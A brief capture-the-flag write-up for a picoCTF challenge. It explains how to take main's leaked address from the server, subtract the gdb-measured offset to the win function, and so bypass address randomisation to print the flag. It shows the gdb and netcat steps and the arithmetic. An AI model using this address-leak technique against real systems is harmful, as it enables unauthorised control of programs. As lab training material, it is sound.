Analyze how vuln.c works
See that in order to win we have to call the win function for the program to open flag.txt and diplay the flag

first we have to run gdb on vuln
Command: gdb vuln

to view the disassembler code of a function run this command:
Command: disass 'function'

INSTANCE: disass main -> 133d
INSTANCE: disass win -> 12a7

Now that we have this we have to subtract these values:
133d - 12a7 = 96

we have to run the netcat nc rescued-float.picoctf.net 61491

then it will give the address of main
next we have to do is to subtract the value by 96 then the flag will be displayed

INSTANCE: 5ebaba48f33d â€“ 96 = 5EBABA48F2A7
